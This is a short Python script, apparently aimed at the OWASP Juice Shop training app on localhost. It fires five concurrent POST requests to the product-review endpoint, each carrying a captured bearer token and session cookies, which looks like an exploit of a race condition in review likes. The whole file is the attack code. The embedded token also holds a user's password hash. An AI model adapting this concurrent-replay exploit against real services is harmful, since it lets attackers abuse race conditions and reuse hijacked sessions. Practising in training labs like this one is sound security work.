import threading
import requests

def send_request():
    url = 'http://127.0.0.1:3000/rest/products/reviews'
    headers = {
        'Content-Length': '26',
        'sec-ch-ua': '"Chromium";v="123", "Not:A-Brand";v="8"',
        'X-User-Email': 'test@gmail.com',
        'sec-ch-ua-mobile': '?0',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNWRlZTYxOTdhZjk4MDczYjVlMGI3ODQyZDI1MjcwZTgiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI0LTA1LTAyIDA5OjM4OjAxLjE5OSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI0LTA1LTAyIDA5OjM4OjAxLjE5OSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MTQ2NDI3MDB9.WPLzm_yFaO8GBepy96W7ZJrTuXPF5dd__JA4WuD5yXLXB7x_MPoQOsjqX8PopvLl_wMg65Xp1HWVFcFvNS8Lk4qI29W37X98wv6AC7G8TX2ZJnELJ5S9Qj4fIoJZl__bhk6q2I8JBz_JbAjrt8FElg8SmJoRebzJMUGKX69qmVM',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-platform': '"Linux"',
        'Origin': 'http://127.0.0.1:3000',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://127.0.0.1:3000/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'cookieconsent_status=dismiss; welcomebanner_status=dismiss; language=fr_FR; continueCodeFindIt=aotOubIOTBC2s0iQuwHXIkuw9cEJu0JIMdhaRcvqtGVCqQiN1f0YhR0UaMuKpUYVHxqi02FWn; continueCodeFixIt=Q7h9ueigTJsQfPtXuLCriDuqwIe4upRi3DUWvIl6h40sgptXDc5XFjRHovu29trvCK7tBbiPQ; continueCode=mVhbtyIOTpCOsMieSVUBHmtnc1I9TMCKs1Fri4faSZUYHguwhPt9cjIoTwC3s5F3SjU8HZEuLLhM8te8cNoIpvTRosmBFXjfxKHzLuVDhyvtQ5IxXTR5CzgF8xiVXf6OSzMUr3Hbwt6qcRoT2os6KFMYipZfN5SWLUgMuyRhOBt16c4nCVBsm8iv9f9pSmvUM2H5nuEMhMxtQBcnZIRr'
    }
    data = '{"id":"a9yWDzuwg8PSptLav"}'
    response = requests.post(url, headers=headers, data=data)
    print(response.text)

# Nombre de threads à lancer
num_threads = 5

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

